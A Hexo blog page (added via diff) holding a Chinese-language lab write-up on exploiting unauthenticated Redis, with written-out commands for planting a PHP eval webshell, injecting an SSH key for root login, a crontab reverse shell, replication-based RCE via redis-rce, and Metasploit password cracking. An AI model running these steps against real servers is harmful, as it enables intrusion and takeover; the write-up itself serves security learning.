@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="环境搭建请参考https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9548962.html redis是什么？ 1Redis是一个开源的内存数据结构存储系统，常用作数据库、缓存和消息中间件。它支持多种数据结构，包括字符串、哈希表、列表、集合、有序集合等，提供了丰富的操作命令，可以进行原子性的操作，支持持久化和复制等高级功能，同时具有高性能、高可用性和可扩展性等优点。Redis通常用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权">
+<meta property="og:url" content="http://example.com/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境搭建请参考https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9548962.html redis是什么？ 1Redis是一个开源的内存数据结构存储系统，常用作数据库、缓存和消息中间件。它支持多种数据结构，包括字符串、哈希表、列表、集合、有序集合等，提供了丰富的操作命令，可以进行原子性的操作，支持持久化和复制等高级功能，同时具有高性能、高可用性和可扩展性等优点。Redis通常用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis4.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis7.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis8.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis9.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis10.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis11.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis12.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/redis13.png">
+<meta property="article:published_time" content="2023-06-07T03:20:21.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:48:32.326Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/redis1.png">
+
+<link rel="canonical" href="http://example.com/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>redis未授权 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis未授权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-07 11:20:21" itemprop="dateCreated datePublished" datetime="2023-06-07T11:20:21+08:00">2023-06-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:48:32" itemprop="dateModified" datetime="2025-05-25T11:48:32+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>环境搭建请参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
+<p>redis是什么？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redis是一个开源的内存数据结构存储系统，常用作数据库、缓存和消息中间件。它支持多种数据结构，包括字符串、哈希表、列表、集合、有序集合等，提供了丰富的操作命令，可以进行原子性的操作，支持持久化和复制等高级功能，同时具有高性能、高可用性和可扩展性等优点。Redis通常用于高性能、高并发的Web应用程序、实时系统和分布式系统中，是一个非常流行的数据存储和缓存解决方案。</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>简单说，漏洞的产生条件有以下两点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 </span><br></pre></td></tr></table></figure>
+
+<p>危害：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>搭建好环境过后，靶机启动redis服务，攻击机与其进行交互</p>
+<p><img src="https://ilikeoyt.github.io/image/redis1.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/redis2.png" alt="img"></p>
+<p>可以看到该redis服务对公网开放，并且没有启用认证</p>
+<h3 id="攻击方式1：利用redis写webshell"><a href="#攻击方式1：利用redis写webshell" class="headerlink" title="攻击方式1：利用redis写webshell"></a>攻击方式1：利用redis写webshell</h3><p>利用前提：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限</span><br><span class="line">（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）</span><br></pre></td></tr></table></figure>
+
+<p>由于是本地搭建，我们已经知道了路径，所以直接写就行</p>
+<p><img src="https://ilikeoyt.github.io/image/redis4.png" alt="img"></p>
+<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
+<p>靶机验证</p>
+<p><img src="https://ilikeoyt.github.io/image/redis5.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /home/ycx/redis/redis-2.8.17# 修改靶机Redis数据库路径</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接(前提是靶机开启了web服务)</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>
+
+<p>我Ubuntu没有安装web服务，就不演示执行效果了</p>
+<h3 id="攻击方式2：利用公私钥认证获得root权限"><a href="#攻击方式2：利用公私钥认证获得root权限" class="headerlink" title="攻击方式2：利用公私钥认证获得root权限"></a>攻击方式2：利用公私钥认证获得root权限</h3><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</p>
+<p>靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf</p>
+<p>在靶机中执行 mkdir &#x2F;root&#x2F;.ssh 命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</p>
+<p>在攻击机中生成ssh公钥和私钥，密码设置为空：</p>
+<p><img src="https://ilikeoyt.github.io/image/redis6.png" alt="img"></p>
+<p>进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p>
+<p><img src="https://ilikeoyt.github.io/image/redis7.png" alt="img"></p>
+<p>链接靶机上的redis服务，</p>
+<p>将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p>
+<p><img src="https://ilikeoyt.github.io/image/redis8.png" alt="img"></p>
+<p>远程登录靶机的redis服务：redis-cli -h 192.168.0.104</p>
+<p>并使用 CONFIG GET dir 命令得到redis备份的路径</p>
+<p>更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)</p>
+<p>设置上传公钥的备份文件名字为authorized_key</p>
+<p><img src="https://ilikeoyt.github.io/image/redis9.png" alt="img"></p>
+<p>至此成功写入ssh公钥到靶机</p>
+<p>使用公钥免密登录靶机</p>
+<p><img src="https://ilikeoyt.github.io/image/redis10.png" alt="img"></p>
+<h3 id="攻击方式3：计划任务反弹shell"><a href="#攻击方式3：计划任务反弹shell" class="headerlink" title="攻击方式3：计划任务反弹shell"></a>攻击方式3：计划任务反弹shell</h3><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p>
+<p>首先我们需要定位到我们需要的文件路径下，因为在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;下如果文件名是root，那么会定时执行里面的命令。这个目录不同操作系统是不一样我的是debain的。具体步骤如下：</p>
+<p><img src="https://ilikeoyt.github.io/image/redis11.png" alt="img"></p>
+<p>按理来说下载就可以反弹shell了，但是解决了很多错误之后依旧无法成功，最后查了一下好像是因为乱码的问题</p>
+<p><img src="https://ilikeoyt.github.io/image/redis12.png" alt="img"></p>
+<p>手动删除后也无法成功</p>
+<p>**总结:**计时任务反弹shell 如果是ubuntu和debian操作系统这个就没有办法利用成功，centos操作系统是可以的利用的</p>
+<h3 id="攻击方式4：利用redis主从复制反弹shell"><a href="#攻击方式4：利用redis主从复制反弹shell" class="headerlink" title="攻击方式4：利用redis主从复制反弹shell"></a>攻击方式4：利用redis主从复制反弹shell</h3><h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><p>Redis主从复制是一种数据复制机制，它允许将一个Redis服务器的数据复制到多个Redis从服务器中。在主从复制中，一个Redis服务器充当主服务器，而其他Redis服务器则充当从服务器。主服务器将写操作的数据同步到从服务器，从服务器只能读取数据，不能写入数据。</p>
+<p>当主服务器接收到写操作时，它将同步写入所有从服务器，从而确保所有服务器的数据一致。这种机制可以提高Redis的可伸缩性和可用性，因为从服务器可以处理读操作，从而减轻主服务器的负载。</p>
+<p>主从复制也可以用于数据备份、故障转移和负载均衡。如果主服务器出现故障，从服务器可以自动接管主服务器的工作，从而确保Redis服务的可用性。如果需要扩展读取性能，可以增加从服务器来处理更多的读操作。</p>
+<h4 id="复现（redis版本需要是4-x或者5-x）"><a href="#复现（redis版本需要是4-x或者5-x）" class="headerlink" title="复现（redis版本需要是4.x或者5.x）"></a>复现（redis版本需要是4.x或者5.x）</h4><p>由于换版本一直出现问题，我使用windows来作为靶机（这个过程真的很艰辛）</p>
+<p>容易踩的坑：Windows防火墙没有放行6379端口， redis.windows.conf里面的bind设置为了127.0.0.1，需要改为：0.0.0.0</p>
+<p>启动命令为：redis-server.exe redis.windows.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">第一步：git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git</span><br><span class="line">        #下载RedisModules-ExecuteCommand</span><br><span class="line">第二步：git clone https://github.com/Ridter/redis-rce</span><br><span class="line">        #下载redis-rce</span><br><span class="line">第三步：cd RedisModules-ExecuteCommand</span><br><span class="line">第四步:make</span><br><span class="line">        #进入RedisModules-ExecuteCommand 使用make进行编译</span><br><span class="line">第五步:mv module.so /root/redis-rce</span><br><span class="line">        #编译之后将module.so移到redis-rce</span><br><span class="line">第六步：cd /root/redis-rce</span><br><span class="line">第七步：python3 redis-rce.py -r 192.168.3.207 -L 192.168.3.231 -f module.so  </span><br><span class="line">        #进入到redis-rce 执行命令，-r是目标IP -L是攻击机ip </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/redis13.png" alt="img"></p>
+<p>i: 交互式shell ，r: 反弹shell</p>
+<h2 id="利用msf破解redis密码"><a href="#利用msf破解redis密码" class="headerlink" title="利用msf破解redis密码"></a>利用msf破解redis密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run#开启msf</span><br><span class="line">search redis#查看有关redis的模块</span><br><span class="line">use 5#选择5号模块</span><br><span class="line">show options #展示需要设置的参数</span><br><span class="line">set RHOST 192.168.3.207 #设置靶机的ip</span><br><span class="line">run #运行模块</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/05/CISCN-go-session-derbug-unzip/"> CISCN:go_session,derbug,unzip</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/08/%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/">陕西省赛部分web复现 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" rel="next" title="VM沙盒逃逸">
+      VM沙盒逃逸 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F1%EF%BC%9A%E5%88%A9%E7%94%A8redis%E5%86%99webshell"><span class="nav-number">1.1.</span> <span class="nav-text">攻击方式1：利用redis写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F2%EF%BC%9A%E5%88%A9%E7%94%A8%E5%85%AC%E7%A7%81%E9%92%A5%E8%AE%A4%E8%AF%81%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="nav-number">1.2.</span> <span class="nav-text">攻击方式2：利用公私钥认证获得root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F3%EF%BC%9A%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.</span> <span class="nav-text">攻击方式3：计划任务反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F4%EF%BC%9A%E5%88%A9%E7%94%A8redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.4.</span> <span class="nav-text">攻击方式4：利用redis主从复制反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">主从复制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%EF%BC%88redis%E7%89%88%E6%9C%AC%E9%9C%80%E8%A6%81%E6%98%AF4-x%E6%88%96%E8%80%855-x%EF%BC%89"><span class="nav-number">1.4.2.</span> <span class="nav-text">复现（redis版本需要是4.x或者5.x）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8msf%E7%A0%B4%E8%A7%A3redis%E5%AF%86%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">利用msf破解redis密码</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
